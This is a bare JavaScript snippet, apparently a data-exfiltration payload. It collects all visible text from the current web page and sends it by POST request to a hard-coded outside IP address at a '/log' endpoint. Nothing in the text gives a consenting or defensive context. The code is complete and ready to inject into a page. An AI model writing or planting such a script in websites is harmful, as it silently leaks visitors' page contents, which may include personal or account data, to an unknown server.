// Collect some page content or other data
let data = document.body.innerText;

// Send this data to your server via a POST request
fetch("http://185.196.11.208:8000/log", {
  method: "POST",
  body: "content=" + encodeURIComponent(data),  // Encodes the data to be safely sent over HTTP
  headers: { "Content-Type": "application/x-www-form-urlencoded" }
});
